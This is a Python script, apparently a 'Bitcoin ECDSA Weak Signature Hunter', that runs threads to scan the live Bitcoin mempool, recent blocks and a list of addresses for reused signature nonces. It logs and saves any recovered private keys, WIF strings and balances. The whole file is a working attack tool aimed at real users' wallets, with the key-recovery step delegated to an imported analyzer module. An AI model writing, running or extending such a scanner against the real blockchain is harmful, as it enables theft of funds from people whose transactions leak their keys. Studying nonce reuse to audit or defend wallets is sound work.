
#!/usr/bin/env python3
import time
import logging
import requests
import json
from typing import Dict, List, Optional
from btc_analyzer import BTCAnalyzer
from attached_assets.address_list import ADDRESSES_TO_CHECK
import threading
import queue
import random

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ContinuousScanner:
    def __init__(self):
        self.analyzer = BTCAnalyzer()
        self.found_weak_sigs = []
        self.scan_count = 0
        self.running = True
        
    def scan_mempool_continuously(self):
        """Continuously scan Bitcoin mempool for weak signatures"""
        logger.info("🔍 Starting continuous mempool scanning for weak signatures...")
        
        while self.running:
            try:
                # Get unconfirmed transactions
                response = requests.get(
                    'https://blockchain.info/unconfirmed-transactions?format=json',
                    timeout=10
                )
                
                if response.status_code == 200:
                    mempool_data = response.json()
                    transactions = mempool_data.get('txs', [])
                    
                    logger.info(f"📊 Scanning {len(transactions)} mempool transactions...")
                    
                    for tx in transactions:
                        if not self.running:
                            break
                            
                        tx_id = tx.get('hash')
                        if tx_id:
                            self.scan_count += 1
                            weak_result = self.analyze_transaction_for_weakness(tx_id)
                            
                            if weak_result:
                                logger.critical(f"🚨 WEAK SIGNATURE FOUND! TX: {tx_id}")
                                self.found_weak_sigs.append(weak_result)
                                self.display_vulnerability(weak_result)
                                
                                # Don't stop - continue searching for more
                                logger.info("🔄 Continuing search for more vulnerabilities...")
                
                # Brief pause before next scan
                time.sleep(2)
                
            except Exception as e:
                logger.error(f"❌ Mempool scan error: {e}")
                time.sleep(5)
    
    def scan_recent_blocks(self):
        """Scan recent blocks for weak signatures"""
        logger.info("🔍 Scanning recent blocks for weak signatures...")
        
        while self.running:
            try:
                # Get latest block
                response = requests.get('https://blockchain.info/latestblock', timeout=10)
                if response.status_code == 200:
                    latest_block = response.json()
                    block_hash = latest_block.get('hash')
                    
                    # Get block transactions
                    block_response = requests.get(
                        f'https://blockchain.info/rawblock/{block_hash}',
                        timeout=15
                    )
                    
                    if block_response.status_code == 200:
                        block_data = block_response.json()
                        transactions = block_data.get('tx', [])
                        
                        logger.info(f"📦 Scanning block {block_hash[:16]}... with {len(transactions)} transactions")
                        
                        for tx in transactions[:50]:  # Scan first 50 transactions
                            if not self.running:
                                break
                                
                            tx_id = tx.get('hash')
                            if tx_id:
                                self.scan_count += 1
                                weak_result = self.analyze_transaction_for_weakness(tx_id)
                                
                                if weak_result:
                                    logger.critical(f"🚨 WEAK SIGNATURE FOUND! TX: {tx_id}")
                                    self.found_weak_sigs.append(weak_result)
                                    self.display_vulnerability(weak_result)
                
                time.sleep(30)  # Wait for next block
                
            except Exception as e:
                logger.error(f"❌ Block scan error: {e}")
                time.sleep(10)
    
    def scan_known_addresses(self):
        """Continuously scan known vulnerable addresses"""
        logger.info("🔍 Scanning known addresses for weak signatures...")
        
        while self.running:
            for address in ADDRESSES_TO_CHECK:
                if not self.running:
                    break
                    
                try:
                    logger.info(f"🏠 Analyzing address: {address}")
                    results = self.analyzer.analyze_address(address)
                    
                    if results.get('weak_signatures'):
                        for weak_sig in results['weak_signatures']:
                            if weak_sig.get('type') == 'reused_r':
                                logger.critical(f"🚨 NONCE REUSE FOUND! Address: {address}")
                                self.found_weak_sigs.append({
                                    'address': address,
                                    'weakness': weak_sig,
                                    'full_results': results
                                })
                                self.display_vulnerability({
                                    'address': address,
                                    'weakness': weak_sig,
                                    'full_results': results
                                })
                    
                    # Small delay between addresses
                    time.sleep(1)
                    
                except Exception as e:
                    logger.error(f"❌ Error analyzing address {address}: {e}")
                    continue
            
            # Completed one full cycle
            logger.info("🔄 Completed address scan cycle, restarting...")
            time.sleep(5)
    
    def analyze_transaction_for_weakness(self, tx_id: str) -> Optional[Dict]:
        """Analyze a single transaction for weak signatures"""
        try:
            results = self.analyzer.analyze_transaction(tx_id)
            
            if 'error' in results:
                return None
            
            # Check for nonce reuse
            weak_signatures = results.get('weak_signatures', [])
            for weak_sig in weak_signatures:
                if weak_sig.get('type') == 'reused_r':
                    logger.warning(f"⚠️  Potential nonce reuse in {tx_id}")
                    
                    # Try to recover private key
                    if 'all_signatures' in weak_sig and len(weak_sig['all_signatures']) >= 2:
                        return {
                            'tx_id': tx_id,
                            'weakness_type': 'nonce_reuse',
                            'weakness': weak_sig,
                            'full_results': results
                        }
            
            # Check for recovered private keys
            if results.get('private_keys_found', 0) > 0:
                logger.warning(f"⚠️  Private key recovered from {tx_id}")
                return {
                    'tx_id': tx_id,
                    'weakness_type': 'private_key_recovered',
                    'full_results': results
                }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error analyzing {tx_id}: {e}")
            return None
    
    def display_vulnerability(self, result: Dict):
        """Display found vulnerability details"""
        logger.critical("="*60)
        logger.critical("🚨 VULNERABILITY FOUND! 🚨")
        logger.critical("="*60)
        
        if 'tx_id' in result:
            logger.critical(f"Transaction ID: {result['tx_id']}")
        
        if 'address' in result:
            logger.critical(f"Address: {result['address']}")
        
        weakness = result.get('weakness', {})
        if weakness:
            logger.critical(f"Weakness Type: {weakness.get('type', 'Unknown')}")
            logger.critical(f"Details: {weakness.get('details', 'No details')}")
            
            if weakness.get('type') == 'reused_r':
                logger.critical(f"Reused R value: {weakness.get('r', 'N/A')}")
                logger.critical(f"Reuse count: {weakness.get('reuse_count', 'Unknown')}")
        
        # Try to extract recovered private keys
        full_results = result.get('full_results', {})
        if full_results.get('private_keys_found', 0) > 0:
            for weak_sig in full_results.get('weak_signatures', []):
                if weak_sig.get('type') == 'recovered_key':
                    logger.critical(f"🔑 PRIVATE KEY: {weak_sig.get('private_key', 'N/A')}")
                    logger.critical(f"🏠 ADDRESS: {weak_sig.get('address', 'N/A')}")
                    logger.critical(f"💰 BALANCE: {weak_sig.get('balance', 'N/A')} BTC")
                    logger.critical(f"📝 WIF: {weak_sig.get('wif', 'N/A')}")
        
        logger.critical("="*60)
        
        # Save to file
        with open('found_vulnerabilities.json', 'a') as f:
            json.dump(result, f, indent=2)
            f.write('\n')
    
    def start_continuous_scan(self):
        """Start all scanning threads"""
        logger.info("🚀 Starting continuous weak signature scanner...")
        logger.info("🎯 Will not stop until weak signatures are found!")
        
        # Start multiple scanning threads
        threads = [
            threading.Thread(target=self.scan_mempool_continuously, name="Mempool Scanner"),
            threading.Thread(target=self.scan_recent_blocks, name="Block Scanner"),
            threading.Thread(target=self.scan_known_addresses, name="Address Scanner")
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
            logger.info(f"✅ Started {thread.name}")
        
        # Monitor progress
        try:
            while self.running:
                time.sleep(10)
                logger.info(f"📊 Status: {self.scan_count} transactions scanned, {len(self.found_weak_sigs)} vulnerabilities found")
                
                if len(self.found_weak_sigs) > 0:
                    logger.info(f"🎉 Found {len(self.found_weak_sigs)} weak signatures so far!")
        
        except KeyboardInterrupt:
            logger.info("🛑 Stopping scanner...")
            self.running = False

def main():
    scanner = ContinuousScanner()
    
    print("""
🔍 Bitcoin ECDSA Weak Signature Hunter
=====================================
This scanner will continuously search for:
- Nonce reuse vulnerabilities
- Weak ECDSA signatures  
- Private key recovery opportunities

Press Ctrl+C to stop.
""")
    
    scanner.start_continuous_scan()

if __name__ == "__main__":
    main()
